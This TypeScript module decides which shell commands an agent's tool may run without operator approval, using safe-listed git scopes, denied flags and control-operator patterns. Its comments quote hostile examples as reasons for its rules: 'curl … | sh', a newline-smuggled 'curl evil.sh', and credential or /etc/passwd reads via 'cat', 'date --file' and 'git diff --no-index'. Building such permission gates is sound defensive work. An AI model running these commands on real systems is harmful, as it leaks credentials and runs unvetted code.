/**
 * The command-scope engine: which *invocations* of a shell tool may run
 * unattended.
 *
 * `ToolRisk` classifies a tool. That is too coarse for a shell, whose calls
 * range from `git status` to `curl … | sh`, so this narrows a `gated` tool
 * one call at a time — a base command plus the argument shapes that keep it
 * read-only, never a bare executable and never a whole command string.
 *
 * Parsing is deliberately dumb, and that is the design rather than a
 * shortcut: tokenize, take the base command, scan for control operators.
 * Anything ambiguous is "not safe", so the failure mode of a parser that
 * disagrees with `sh` is a prompt somebody has to answer, not a command
 * nobody vetted.
 */

/** One narrow permission to run a command: what, and in which forms. */
export interface CommandScope {
  /** The base command, matched exactly — never a path (`/bin/git` is not `git`). */
  command: string;
  /** Literal arguments that must follow it, in order (`['push']`). */
  args?: string[];
  /**
   * Long flags (`--force`) and short letters (`f`) that disqualify a match.
   * Short letters are checked inside bundles, so `-fdx` trips on `f`.
   */
  deniedFlags?: string[];
  /** Literal arguments that disqualify a match anywhere after `args`. */
  deniedArgs?: string[];
  /**
   * Refuse *any* argument that is not a flag.
   *
   * The listing forms of `git branch` and `git tag` are the safe ones, and
   * what separates them from the creating forms is a positional: `git
   * branch` lists, `git branch release` creates. Excluding flags is not
   * enough there, because creation needs none.
   */
  listOnly?: boolean;
  /**
   * The only flags this scope permits. Present, it replaces "anything not
   * denied" with "nothing but these" — which is the direction to fail in
   * for a command whose flags can mutate: `git branch --unset-upstream`
   * changes repository config, takes no positional, and is not a delete or
   * a force, so a deny list has to have thought of it and an allow list
   * does not.
   *
   * Long flags match by name, so `--sort=-committerdate` is `--sort`.
   * Short flags match per letter inside a bundle, and digits are ignored
   * because they are arguments rather than flags (`git tag -n5`).
   */
  allowedFlags?: string[];
  /**
   * Refuse `:branch` and `+branch` arguments. Git's refspec syntax makes
   * those a delete and a forced update *without any flag*, so a scope that
   * only excluded flags would let `git push origin :main` through as an
   * ordinary push.
   */
  denyRefspecForms?: boolean;
}

/**
 * Flags that turn something else into a program, a network peer, or a file
 * write — and are therefore refused in every scope, safe-listed or
 * persisted. `git -c core.pager=…` and `git diff --no-index /etc/passwd`
 * are the reason: both are read-only commands by name.
 */
const ALWAYS_DENIED_FLAGS = [
  '-c',
  '--config',
  '--config-env',
  '--exec',
  '--exec-path',
  '--upload-pack',
  '--receive-pack',
  '--ext-diff',
  '--no-index',
  '--output',
  '--open-files-in-pager',
  // Reads a path the scope never mentioned. `date --file=…/credentials.json`
  // is not a date lookup; it is a file read whose contents come back in the
  // error text, from a command whose name says otherwise.
  '--file',
];

/**
 * What a persisted scope excludes, whatever it was approved for. Approving
 * `git push origin main` must not persist a permission that covers
 * `git push --force` — the point of storing a scope rather than a command
 * string is to be useful next time, and the point of storing a scope rather
 * than the bare executable is that it still says no to this.
 */
const DESTRUCTIVE_FLAGS = [
  '--force',
  '--force-with-lease',
  '--force-if-includes',
  '--delete',
  '--prune',
  '--mirror',
  '--hard',
  '--no-verify',
  'f',
  'd',
  'D',
];

/**
 * The commands that run unattended out of the box.
 *
 * Short on purpose. Every entry is a promise that no argument shape reaches
 * outside the repository it is run in, and the tempting additions —
 * `cat`, `ls`, `grep` — cannot make it: they read whatever path they are
 * given, and `cat ~/.stratus/credentials.json` is a safe-listed credential
 * read. An operator who wants those adds them deliberately, or approves
 * them once and keeps the scope.
 *
 * The test is *what an argument can make the command do*, not what the
 * command is called. `date` was on this list until someone pointed out
 * `date --file=~/.stratus/credentials.json`, which is not a date lookup:
 * GNU `date` reads that file and echoes each unparseable line back in its
 * error text, which the shell tool returns. A command that can be handed a
 * path is a file reader wearing another name.
 */
export const SAFE_COMMAND_SCOPES: CommandScope[] = [
  { command: 'git', args: ['status'] },
  { command: 'git', args: ['log'] },
  { command: 'git', args: ['diff'] },
  { command: 'git', args: ['show'] },
  { command: 'git', args: ['blame'] },
  { command: 'git', args: ['describe'] },
  { command: 'git', args: ['rev-parse'] },
  { command: 'git', args: ['ls-files'] },
  { command: 'git', args: ['shortlog'] },
  // Listing branches, tags, and remotes is read-only. Creating one needs no
  // flag at all — `git branch release` is a mutation and `git branch` is
  // not — so these are list-only, and every other form asks.
  {
    command: 'git',
    args: ['branch'],
    listOnly: true,
    // Named rather than excluded: `git branch` has flag-only mutations
    // (`--unset-upstream`, `-u origin/main`) that no list of destructive
    // *shapes* would have caught, so this scope covers the listing flags
    // and nothing else.
    allowedFlags: [
      '--list', '--all', '--remotes', '--show-current', '--verbose', '--no-verbose',
      '--color', '--no-color', '--column', '--no-column', '--sort', '--format',
      '--contains', '--no-contains', '--merged', '--no-merged', '--points-at',
      '--ignore-case', '--omit-empty', '--abbrev', '--no-abbrev',
      'l', 'a', 'r', 'v', 'i', 'q',
    ],
    deniedFlags: ['--delete', '--move', '--copy', '--force', 'd', 'D', 'm', 'M', 'C', 'u'],
  },
  {
    command: 'git',
    args: ['tag'],
    listOnly: true,
    allowedFlags: [
      '--list', '--contains', '--no-contains', '--merged', '--no-merged', '--points-at',
      '--sort', '--format', '--color', '--no-color', '--column', '--no-column',
      '--ignore-case', '--omit-empty',
      'l', 'n', 'i',
    ],
    deniedFlags: ['--delete', '--force', 'd', 'f'],
  },
  {
    command: 'git',
    args: ['remote'],
    listOnly: true,
    allowedFlags: ['--verbose', 'v'],
    deniedArgs: ['add', 'remove', 'rm', 'rename', 'set-url', 'set-head', 'set-branches', 'prune', 'update'],
  },
  { command: 'pwd' },
  { command: 'whoami' },
  { command: 'uname' },
];

/**
 * Every shell control operator, as a rejection set rather than a blacklist
 * of the memorable ones. A single `&` backgrounds a command as surely as
 * `&&` chains one, and a newline runs the next line whatever came before
 * it — an enumerated list is exactly how `git status\ncurl evil.sh` gets
 * auto-approved.
 */
const CONTROL_OPERATORS: Array<{ pattern: RegExp; name: string }> = [
  { pattern: /\$\(/, name: 'command substitution ($( ))' },
  { pattern: /`/, name: 'command substitution (backticks)' },
  { pattern: /\|/, name: 'a pipe (|)' },
  { pattern: /&/, name: 'an ampersand (& or &&)' },
  { pattern: /;/, name: 'a semicolon (;)' },
  { pattern: /[\r\n]/, name: 'a newline' },
  { pattern: /[()]/, name: 'a subshell (parentheses)' },
  { pattern: /[<>]/, name: 'a redirection (< or >)' },
  { pattern: /\$\{/, name: 'a parameter expansion (${ })' },
];

export interface CommandAnalysis {
  /** The command as written, for messages and prompts. */
  command: string;
  /** The base command, absent when the string could not be tokenized. */
  base?: string;
  tokens: string[];
  /**
   * Why this invocation cannot be auto-approved at all — a control
   * operator, an unbalanced quote, an absolute path. Undefined means it is
   * a candidate for scope matching, not that it is allowed.
   */
  disqualifiedBy?: string;
}

const tokenize = (command: string): string[] | undefined => {
  const tokens: string[] = [];
  let current = '';
  let quote: '"' | "'" | undefined;
  let started = false;

  for (const char of command) {
    if (quote) {
      if (char === quote) {
        quote = undefined;
      } else {
        current += char;
      }
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      started = true;
      continue;
    }
    if (char === ' ' || char === '\t') {
      if (started) {
        tokens.push(current);
        current = '';
        started = false;
      }
      continue;
    }
    current += char;
    started = true;
  }
  if (quote) {
    // An unbalanced quote means this parser and the shell disagree about
    // where the command ends. There is no safe reading of that.
    return undefined;
  }
  if (started) {
    tokens.push(current);
  }
  return tokens;
};

/** Read a command string as far as it can be read safely. */
export const analyzeCommand = (command: string): CommandAnalysis => {
  for (const operator of CONTROL_OPERATORS) {
    if (operator.pattern.test(command)) {
      return { command, tokens: [], disqualifiedBy: `it contains ${operator.name}` };
    }
  }

  const tokens = tokenize(command);
  if (!tokens || tokens.length === 0) {
    return { command, tokens: [], disqualifiedBy: 'it could not be read as a command' };
  }

  const base = tokens[0] as string;
  if (base.includes('/') || base.includes('\\')) {
    // A scope names a command, and `/usr/bin/git` is not that name. Refusing
    // beats resolving: `./git` in a cloned repository is a different program
    // with the same basename.
    return { command, tokens, disqualifiedBy: 'it names a path rather than a command' };
  }
  if (base.startsWith('-') || base.includes('=')) {
    // `FOO=bar cmd` is an environment assignment, which is the shell's job
    // and not this parser's.
    return { command, tokens, disqualifiedBy: 'it does not start with a command' };
  }

  return { command, base, tokens };
};

const flagsOf = (token: string): { long?: string; shorts: string[] } => {
  if (token.startsWith('--')) {
    const [name] = token.split('=');
    return { long: name ?? token, shorts: [] };
  }
  if (token.startsWith('-') && token.length > 1) {
    const [bundle] = token.slice(1).split('=');
    return { shorts: [...(bundle ?? '')] };
  }
  return { shorts: [] };
};

const deniesFlag = (denied: string[], token: string): boolean => {
  // The token as written, minus any `=value`, so a deny list can name a
  // short flag whole (`-c`) as well as by its letter — `git -c` is the
  // entry `ALWAYS_DENIED_FLAGS` was written for, and letter-by-letter
  // matching alone never reached it.
  const [spelled] = token.split('=');
  if (spelled !== undefined && denied.includes(spelled)) {
    return true;
  }
  const { long, shorts } = flagsOf(token);
  if (long && denied.includes(long)) {
    return true;
  }
  return shorts.some((letter) => denied.includes(letter));
};

/** Whether every part of a flag token is on an allowlist. */
const allowsFlag = (allowed: string[], token: string): boolean => {
  const { long, shorts } = flagsOf(token);
  if (long) {
    return allowed.includes(long);
  }
  const letters = shorts.filter((letter) => !/[0-9]/.test(letter));
  return letters.length > 0 && letters.every((letter) => allowed.includes(letter));
};

/** Whether an invocation falls inside one scope. */
export const matchesScope = (analysis: CommandAnalysis, scope: CommandScope): boolean => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return false;
  }
  if (analysis.base !== scope.command) {
    return false;
  }

  const args = analysis.tokens.slice(1);
  const required = scope.args ?? [];
  if (args.length < required.length) {
    return false;
  }
  for (const [index, expected] of required.entries()) {
    if (args[index] !== expected) {
      return false;
    }
  }

  const denied = [...ALWAYS_DENIED_FLAGS, ...(scope.deniedFlags ?? [])];
  // A required token can itself be a flag — the ones that preceded the
  // first positional when the scope was approved — and a whitelist file is
  // hand-editable, so the prefix is held to the deny list like the rest.
  for (const token of args.slice(0, required.length)) {
    if (token.startsWith('-') && deniesFlag(denied, token)) {
      return false;
    }
  }
  const rest = args.slice(required.length);
  for (const token of rest) {
    if (token.startsWith('-')) {
      if (deniesFlag(denied, token)) {
        return false;
      }
      if (scope.allowedFlags && !allowsFlag(scope.allowedFlags, token)) {
        return false;
      }
      continue;
    }
    if (scope.listOnly) {
      return false;
    }
    if (scope.deniedArgs?.includes(token)) {
      return false;
    }
    if (scope.denyRefspecForms && (token.startsWith(':') || token.startsWith('+'))) {
      return false;
    }
  }
  return true;
};

/** The first scope covering this invocation, if any covers it. */
export const findMatchingScope = (
  analysis: CommandAnalysis,
  scopes: readonly CommandScope[],
): CommandScope | undefined => scopes.find((scope) => matchesScope(analysis, scope));

/**
 * The scope an "always allow" persists.
 *
 * Base command plus its first literal argument — `git push`, not
 * `git push origin main` (too narrow to be worth storing) and not `git`
 * (too broad to be safe) — carrying the destructive-form constraints that
 * make the distinction real, and inheriting anything the safe list already
 * excludes for the same command so a persisted scope can never erase a
 * flag distinction the built-in list draws.
 *
 * Any flags standing between the command and that argument are part of the
 * scope too: `mkdir -p build` persists `mkdir -p build`. `matchesScope`
 * reads `args` as the invocation's leading tokens, so a scope that skipped
 * over `-p` to reach `build` could never match the command it was approved
 * for — every later `mkdir -p …` asked again, under a log line promising it
 * would not.
 *
 * A flag-first scope is exact on its positionals, though: it carries every
 * one of them and refuses any more. Nothing here knows which flags take a
 * separate value, so in `git --git-dir /x status` the first positional is
 * `/x`, not `status`; a scope of `git --git-dir /x` with a free subcommand
 * behind it would have approved every git command against that repository
 * on the strength of one `status`. Exactness costs a prompt for `cp -r src
 * elsewhere` after `cp -r src dist` was approved, which is the direction to
 * fail in. A leading flag the scope must refuse (a destructive one, one the
 * safe list excludes for this command, or one that turns something else
 * into a program) means there is no scope to store, and the answer counts
 * once.
 */
export const normalizeCommandScope = (analysis: CommandAnalysis): CommandScope | undefined => {
  if (analysis.disqualifiedBy || analysis.base === undefined) {
    return undefined;
  }
  const tokens = analysis.tokens.slice(1);
  const firstIndex = tokens.findIndex((token) => !token.startsWith('-'));
  const first = firstIndex === -1 ? undefined : tokens[firstIndex];
  const leading = firstIndex === -1 ? tokens : tokens.slice(0, firstIndex);
  // Inheritance keys on the positional alone: `git --no-pager branch` must
  // pick up `git branch`'s listing-only constraint, or approving it once
  // would persist a wider grant than the safe list's for the same command.
  const sameScope = SAFE_COMMAND_SCOPES
    .filter((scope) => scope.command === analysis.base && (scope.args ?? []).join(' ') === (first ?? ''));
  const inherited = sameScope.flatMap((scope) => scope.deniedFlags ?? []);
  if (leading.some((token) => deniesFlag([...ALWAYS_DENIED_FLAGS, ...DESTRUCTIVE_FLAGS, ...inherited], token))) {
    return undefined;
  }
  const positionals = tokens.filter((token) => !token.startsWith('-'));
  const exact = leading.length > 0;
  const args = exact ? [...leading, ...positionals] : (first === undefined ? [] : [first]);
  const deniedArgs = sameScope.flatMap((scope) => scope.deniedArgs ?? []);
  // Only when every safe scope for this command names one: a persisted
  // scope must be no wider than the built-in, and an allowlist from one of
  // two scopes would narrow the other by accident.
  const allowedFlags = sameScope.length > 0 && sameScope.every((scope) => scope.allowedFlags)
    ? [...new Set(sameScope.flatMap((scope) => scope.allowedFlags ?? []))]
    : undefined;

  return {
    command: analysis.base,
    ...(args.length > 0 ? { args } : {}),
    deniedFlags: [...new Set([...DESTRUCTIVE_FLAGS, ...inherited])],
    ...(deniedArgs.length > 0 ? { deniedArgs: [...new Set(deniedArgs)] } : {}),
    // A persisted scope cannot be wider than the safe list's own for the
    // same command: approving `git branch` once must not turn creating a
    // branch into something that runs unattended forever after. A
    // flag-first scope is exact on positionals for the reason above.
    ...(exact || sameScope.some((scope) => scope.listOnly) ? { listOnly: true } : {}),
    ...(allowedFlags ? { allowedFlags } : {}),
    // Git's syntax, so git's rule: elsewhere a leading `+` is an ordinary
    // argument (`chmod +x`) and refusing it would only cost a prompt for no
    // safety.
    ...(analysis.base === 'git' ? { denyRefspecForms: true } : {}),
  };
};

/** One line an operator can read in a log or a whitelist listing. */
export const describeCommandScope = (scope: CommandScope): string =>
  [scope.command, ...(scope.args ?? [])].join(' ');

/** Whether two scopes permit the same thing, so a whitelist does not grow duplicates. */
export const sameScope = (left: CommandScope, right: CommandScope): boolean =>
  JSON.stringify(normalizeForCompare(left)) === JSON.stringify(normalizeForCompare(right));

const normalizeForCompare = (scope: CommandScope) => ({
  command: scope.command,
  args: scope.args ?? [],
  deniedFlags: [...(scope.deniedFlags ?? [])].sort(),
  deniedArgs: [...(scope.deniedArgs ?? [])].sort(),
  denyRefspecForms: scope.denyRefspecForms ?? false,
  listOnly: scope.listOnly ?? false,
  allowedFlags: [...(scope.allowedFlags ?? [])].sort(),
});

/** Read one scope out of a whitelist file, or refuse it. */
export const parseCommandScope = (raw: unknown): CommandScope | undefined => {
  if (typeof raw !== 'object' || raw === null || Array.isArray(raw)) {
    return undefined;
  }
  const source = raw as Record<string, unknown>;
  if (typeof source.command !== 'string' || source.command.length === 0) {
    return undefined;
  }
  const strings = (value: unknown): string[] | undefined =>
    Array.isArray(value) && value.every((entry) => typeof entry === 'string') ? (value as string[]) : undefined;

  const args = strings(source.args);
  const deniedFlags = strings(source.deniedFlags);
  const deniedArgs = strings(source.deniedArgs);
  const allowedFlags = strings(source.allowedFlags);
  return {
    command: source.command,
    ...(args ? { args } : {}),
    ...(deniedFlags ? { deniedFlags } : {}),
    ...(deniedArgs ? { deniedArgs } : {}),
    ...(source.denyRefspecForms === true ? { denyRefspecForms: true } : {}),
    ...(source.listOnly === true ? { listOnly: true } : {}),
    ...(allowedFlags ? { allowedFlags } : {}),
  };
};
